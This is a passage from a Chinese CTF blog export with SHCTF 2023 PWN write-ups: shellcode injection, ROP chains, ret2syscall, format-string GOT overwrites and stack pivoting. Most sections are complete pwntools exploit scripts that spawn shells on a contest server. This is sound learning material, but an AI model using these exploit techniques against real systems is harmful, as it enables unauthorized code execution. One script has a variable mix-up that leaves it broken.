<p>参数说明：</p>
<ul>
<li><code>ptr</code>：指向接收数据的内存；</li>
<li><code>size</code>：每个元素的大小（字节）；</li>
<li><code>nmemb</code>：读取的元素数量；</li>
<li><code>stream</code>：输入流指针。</li>
</ul>
<p>返回值：</p>
<ul>
<li>实际读取的元素数量（<code>size_t</code>）；</li>
<li>若少于 <code>nmemb</code>，可能是 EOF 或出错。</li>
</ul>
<hr>
<h2><span id="read">read</span></h2><p><code>read</code> 是一个低层函数，从文件描述符读取数据到内存缓冲区。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>fd</code>：文件描述符（例如，<code>0</code> 表示标准输入）；</li>
<li><code>buf</code>：缓冲区；</li>
<li><code>count</code>：要读取的最大字节数。</li>
</ul>
<p>返回值：</p>
<ul>
<li>成功：读取的字节数；</li>
<li>失败：返回 <code>-1</code>，并设置 <code>errno</code>。</li>
</ul>
<hr>
<h1><span id="总结">总结:</span></h1><p>了解函数的作用，可以更好地让我们在代码审计的过程中理清程序之间的逻辑，加油加油！！！</p>
]]></content>
      <categories>
        <category>技巧</category>
        <category>方法</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>SHCTF 2023 [WEEK 2] PWN</title>
    <url>/SHCTF%202023%20%5BWEEK%202%5D%20PWN/</url>
    <content><![CDATA[<p>SHCTF 2023 [WEEK 2] PWN</p>
<span id="more"></span>

<h1><span id="简介">简介</span></h1><p>第二周对比第一周难度提高了些，开始要熟悉做 PWN 的技巧手法了。</p>
<hr>
<h2><span id="easy_shellcode">easy_shellcode</span></h2><ul>
<li><strong>保护机制</strong>：保护全关，栈可执行</li>
<li><strong>利用思路</strong>：利用 buf 泄露栈地址，将 shellcode 写入栈，执行 shellcode 获取 shell</li>
</ul>
<p>查看一下保护机制，保护全关，加上又是<a href="https://so.csdn.net/so/search?q=shellcode&spm=1001.2101.3001.7020">shellcode</a>的，栈可执行，所以可以把shellcode写入栈里</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/1.png"></p>
<p><a href="https://so.csdn.net/so/search?q=ida&spm=1001.2101.3001.7020">ida</a>反汇编一下，发现可以通过buf这里泄露出栈地址（因为没有打开NX保护，栈是可执行的，要想办法把shellcode写入栈上在执行）</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/2.png"></p>
<p>gdb调试下，你就会发现只需要输入0x10个字节，就可以泄露出栈地址（rbp地址），然后距离栈顶的距离为0x80，可以利用这个地址，将shellcode写入，就可以执行shell了</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/3.png"></p>
<p>exp如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>, <span class="number">30735</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;What&#x27;s your name?\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(stack)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;please input your strong\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="baby_rop">baby_rop</span></h2><ul>
<li><strong>保护机制</strong>：32 位，开启 canary 和 NX，静态链接</li>
<li><strong>利用方法一</strong>：ROPgadget 构造 payload</li>
</ul>
<p>查看一下保护机制，32位程序打开了canary 和NX，并且还是静态链接</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/4.png"></p>
<p>用ROPgadget --ropchain来获取rop链再缩短点，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"> </span><br><span class="line"><span class="comment">#io =process(&#x27;./simplerop32&#x27;)</span></span><br><span class="line">io =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30779</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804993d</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e4e80</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080aa06a</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080537da</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804993d</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e4e84</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080aa06a</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/sh\x00&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080537da</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804901e</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e4e80</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804993f</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e4e88</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804993d</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e4e88</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080aa06a</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += p32(<span class="number">11</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049b62</span>) <span class="comment"># int 0x80</span></span><br><span class="line"> </span><br><span class="line">io =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p</span><br><span class="line"> </span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>利用方法二</strong>：ret2syscall</li>
</ul>
<p>还可以用ret2sycall的方法来解决，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"> </span><br><span class="line"><span class="comment">#p =process(&#x27;./111&#x27;)</span></span><br><span class="line">p =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30984</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">read =<span class="number">0x805CAF0</span></span><br><span class="line">edx_ecx_ebx =<span class="number">0x8049941</span></span><br><span class="line">eax =<span class="number">0x80aa06a</span></span><br><span class="line">int_80 =<span class="number">0x8049b62</span></span><br><span class="line">bss =<span class="number">0x80e5000</span>   <span class="comment">#整百就行</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x1c</span> +<span class="number">4</span>) </span><br><span class="line">payload +=p32(read) </span><br><span class="line">payload +=p32(edx_ecx_ebx) +p32(<span class="number">0</span>) +p32(bss) +p32(<span class="number">0x8</span>) </span><br><span class="line">payload +=p32(edx_ecx_ebx) +p32(<span class="number">0</span>) +p32(<span class="number">0</span>) +p32(bss) </span><br><span class="line">payload +=p32(eax) +p32(<span class="number">11</span>) </span><br><span class="line">payload +=p32(int_80)</span><br><span class="line"> </span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="baby_rop2">baby_rop2</span></h2><ul>
<li><strong>保护机制</strong>：64 位，开启 canary 和 NX，静态链接</li>
<li><strong>利用方式</strong>：ROPgadget 构造 ROP 链</li>
</ul>
<p>查看一下保护机制，64位程序打开canary和NX，并且还是静态链接程序，和上一次挺像的</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/5.png"></p>
<p>ida反汇编一下，简简单单的一个栈溢出漏洞，唯一烦的就是该怎么构造rop执行流</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/6.png"></p>
<p>一样可以用ROPgadget来构造rop执行流，唯一不好的地方就是有长度限制，需要自己删减</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"> </span><br><span class="line"><span class="comment">#io =process(&#x27;./111&#x27;)</span></span><br><span class="line">io =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30992</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000419a1c</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000417e25</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401d1d</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401858</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000419a1c</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += p64(<span class="number">59</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401243</span>) <span class="comment"># syscall</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p</span><br><span class="line"> </span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="string">string</span></h2><ul>
<li><strong>保护机制</strong>：全关</li>
<li><strong>漏洞类型</strong>：格式化字符串漏洞</li>
<li><strong>思路</strong>：泄露 libc，修改 printf GOT 表为 system，执行 <code>/bin/sh</code></li>
</ul>
<p>查看一下保护机制，保护全关</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/7.png"></p>
<p>ida反汇编一下，代码审计你会发现出现了格式字符串漏洞，并且在提示 &quot;Input your message:&quot; 的时候，你输入的数据会被 printf 打印出来，这个时候是不是可以把&#x2F;bin&#x2F;sh写进去，然后把 printf 修改成 system ，这样是不是就可以获得shell了，前提就得先泄露libc，得到system</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/8.png"></p>
<p>首先，先得到程序的偏移为6，然后就是去gdb调试，找到合适的地址去泄露libc</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/9.png"></p>
<p>我算到的偏移是0x29d90，不是0x24083，啊啊啊啊怎么算到的啊（有没有师傅浇浇啊T^T）</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/11.png"></p>
<p>有些东西不好理解，也不知道怎么来的，其他大佬的wp，都是默认大家都知道，都不解释的，学的好累啊啊啊啊 T^T </p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">31318</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;%43$p&#x27;</span></span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice:\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your message:\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">libc_base =<span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]   <span class="comment">#0x24083</span></span><br><span class="line">system = libc_base +libc.sym[<span class="string">&#x27;system&#x27;</span>] </span><br><span class="line"> </span><br><span class="line">payload =fmtstr_payload(<span class="number">6</span>, &#123;printf_got: system&#125;)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice:\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your message:\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice:\n&quot;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice:\n&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="原始人起动">原始人，起动</span></h2><ul>
<li><strong>保护机制</strong>：仅开启 NX</li>
<li><strong>备注</strong>：逻辑略绕，需进一步分析</li>
</ul>
<p>查看一下保护机制，只打开了NX</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/12.png"></p>
<p>ida反汇编，代码审计一下，有点难理清里面的逻辑-_-，有点小绕啊啊啊啊，受不了</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/13.png"></p>
<hr>
<h2><span id="要买些东西吗">要买些东西吗</span></h2><ul>
<li><strong>保护机制</strong>：32 位，开启 canary 和 NX</li>
<li><strong>漏洞类型</strong>：格式化字符串漏洞</li>
<li><strong>利用思路</strong>：格式化字符串泄露 canary 与 libc，通过偏移构造 rop 链，调用 system</li>
</ul>
<p>查看一下保护机制，32位程序打开了canary和NX</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/14.png"></p>
<p>ida反汇编，代码审计发现程序出现了格式字符串漏洞，再加上有canary，所以应该是通过格式字符串来泄露canary，下面看看偏移是多少</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/15.png"></p>
<p>运行程序，发现偏移为7，接下来就是gdb调试，去看看canary是第几个参数（如下图，发现canary在第15个参数），并且可以通过第19个参数来泄露libc，来构造rop链</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/16.png"></p>
<p>泄露libc的这个偏移还是没有算到，啊啊啊啊，有知道的师傅浇浇（球球了T^T）</p>
<p><img src="/images/SHCTF2023%5BWEEK2%5DPWN/17.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">31224</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">ret =<span class="number">0x804900e</span></span><br><span class="line">bin_sh =<span class="number">0x804A03F</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;%15$p.%19$p&#x27;</span></span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Your choice:\n&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;and you can get a gift\n&#x27;</span>,payload)</span><br><span class="line"> </span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base =<span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">245</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]   <span class="comment">#0x1aee5</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">system =libc_base +libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#bin_sh =libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"> </span><br><span class="line">payload =<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> +p32(canary) +p32(<span class="number">0</span>) +p32(<span class="number">0</span>) +p32(<span class="number">0</span>) +p32(ret) +p32(system) +p32(<span class="number">0</span>) +p32(bin_sh)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Your choice:\n&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;and you can get the power\n&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="总结">总结</span></h1><p>这周题目确实上档次了，有些点不太好理解，其他大佬的 WP 很多都跳步不解释，需要自己多练题、多调试、多总结，加油加油！！！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>SHCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SHCTF 2023 [WEEK 3] PWN</title>
    <url>/SHCTF%202023%20%5BWEEK%203%5D%20PWN/</url>
    <content><![CDATA[<p>SHCTF 2023 [WEEK 3] PWN</p>
<span id="more"></span>

<h1><span id="简介">简介</span></h1><p>最后一周的题直接上强度了，有点受不了 T^T，先转载官方的 WP 吧，后续琢磨透了再来改。</p>
<hr>
<h2><span id="call_call_would_backdoor">call_call_would_backdoor</span></h2><p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"> </span><br><span class="line">p=remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">31696</span> )</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./bac&#x27;)</span></span><br><span class="line"><span class="comment">#p=gdb.debug(&#x27;./bac&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./bac&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">ladd=elf.symbols[<span class="string">&#x27;backd00r&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%x&quot;</span>%ladd)</span><br><span class="line">p1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(ladd)</span><br><span class="line">p.sendafter(<span class="string">&quot;?&quot;</span>,p1)</span><br><span class="line"> </span><br><span class="line">p2=<span class="string">&quot;MTEwL2Jpbi9zaA==&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;!&quot;</span>,p2)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p.sendlineafter(&quot;:&quot;,p1)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#send</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="transfer">transfer</span></h2><p>程序未启用 PIE，可通过静态调试获取全局变量地址。</p>
<ol>
<li>第一次输入 0xc8 字节写入 data 段；</li>
<li>第二次输入溢出 0x10 字节实现栈迁移；</li>
<li>程序已提供 <code>system</code> 函数。</li>
</ol>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./transfer&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>, <span class="number">32178</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./transfer&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"> </span><br><span class="line">target_addr = <span class="number">0x405160</span>-<span class="number">0x8</span></span><br><span class="line">bin_sh_addr = <span class="number">0x405160</span>+<span class="number">0x18</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401313</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004012a7</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;haha,welcome!&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(target_addr)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">io.recvuntil(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="aftermath">Aftermath</span></h2><p>三条知识点路线（Trail1–3）：</p>
<ol>
<li>用 <code>ctypes</code> 模拟 C 函数与随机数输入绕过；</li>
<li>检查符号 <code>&#39;-&#39;</code> 判断负数，用整数溢出方式输入两个超 <code>INT_MAX</code> 值绕过；</li>
<li>用格式化字符串修改 <code>printf_got</code> 为 <code>system</code>。</li>
</ol>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">native = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> native:</span><br><span class="line">   p = process(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">   libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   p = remote(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">   gdb.attach(p)</span><br><span class="line">   pause()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">   <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">se = <span class="keyword">lambda</span> data: p.send(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">rc = <span class="keyword">lambda</span> numb=<span class="number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> delims: p.recvuntil(delims)</span><br><span class="line">su = <span class="keyword">lambda</span> delim, data: success(delim + <span class="built_in">hex</span>(data))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>():</span><br><span class="line">   libc = cdll.LoadLibrary(<span 